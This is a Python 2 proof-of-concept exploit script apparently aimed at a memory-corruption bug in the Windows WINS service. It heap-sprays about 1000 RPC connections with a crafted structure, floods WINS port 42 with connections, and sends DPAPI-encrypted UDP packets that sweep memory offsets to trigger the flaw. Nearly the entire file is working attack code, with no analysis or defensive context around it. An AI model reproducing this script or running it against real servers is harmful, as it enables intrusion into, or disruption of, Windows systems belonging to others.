##

import sys
import socket
import struct
import time
import os

from ctypes import *
from ctypes.wintypes import DWORD

LocalFree = windll.kernel32.LocalFree
CryptProtectData = windll.crypt32.CryptProtectData
CryptUnprotectData = windll.crypt32.CryptUnprotectData
memcpy = cdll.msvcrt.memcpy

CRYPTPROTECT_LOCAL_MACHINE = 0x04

class DATA_BLOB(Structure):
     _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]


def get_data(blob):
     cbData = int(blob.cbData)
     pbData = blob.pbData
     buffer = c_buffer(cbData)
     memcpy(buffer, pbData, cbData)
     LocalFree(pbData);
     return buffer.raw

def Win32CryptProtectData(plain):
     buffer = c_buffer(plain, len(plain))
     iblob = DATA_BLOB(len(plain), buffer)
     oblob = DATA_BLOB()
     if CryptProtectData(byref(iblob), u"win32crypto.py", None, None, None, CRYPTPROTECT_LOCAL_MACHINE, byref(oblob)):
         return get_data(oblob)
     else:
         return None

def send_packet (sock, ip, port, message):
    packet = ""
    packet += message
    sock.sendto(packet, (ip, port))

################################################################################

# Check args
if len(sys.argv) != 4:
    print "\nusage: python wins_poc.py wins_tcp_dynamic_port wins_udp_dynamic_port writeable_address(hex)"
    print "\nNote: On Windows 2003, the udp dynamic port is the same number of the tcp port less one"
    sys.exit(0)

# Get ports dinamically
tcp_dynamic_port = int(sys.argv[1])
udp_dynamic_port = int(sys.argv[2])
writeable_address = int(sys.argv[3], 16)

# Target IP
target_ip = "127.0.0.1"

################################################################################

# Create connections to do a heap spray
rpc_connections = []
for i in range(0, 1000):
    try:
        p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        p.connect((target_ip, tcp_dynamic_port))
        rpc_connections += [p]
    except Exception, e:
        break

# Struct that is validated by WINS
magic_struct  = ""
magic_struct += "a" * 0x0c
magic_struct += struct.pack("I", writeable_address-0x14)
magic_struct += struct.pack("I", 0)
magic_struct += struct.pack("I", 4)
magic_struct += "b" * (0x20-len(magic_struct))
magic_struct += struct.pack("I", 1)
magic_struct += "c" * (0x2c-len(magic_struct))
magic_struct += struct.pack("I", 0x10c00)
magic_struct += "d" * (0x38-len(magic_struct))
magic_struct += struct.pack("I", 0)

# Data con la forma de la estructura que triggerea el bug
data  = ""
data += magic_struct
data += "B" * (0x4000-len(data))
data += "filling"

# Create connections to do a heap spray
for p in rpc_connections:
    try:
        p.send(data)
    except Exception, e:
        pass

# Get to the limit od WINS connections
print "connecting ..."
ps = []
for i in range(0, 300):
    p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    p.connect((target_ip, 42))
    ps += [p]

# Go through an area 32Kb
for offset in range(0, 0x8000, 4):
    # Data to send
    data  = ""
    data += struct.pack("I", 0)
    data += "A" * 0x0c
    data += struct.pack("I", 0)
    data += struct.pack("I", 0x05000000+offset)

    # Encrypt
    data2 = Win32CryptProtectData(data)

    # Send the poisoned packet
    p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    send_packet(p, target_ip, udp_dynamic_port, data2)
    p.close ()

# Close all sockects
print "closing TCP connections ..."
for p in ps:
    p.close()

for p in rpc_connections:
    p.close()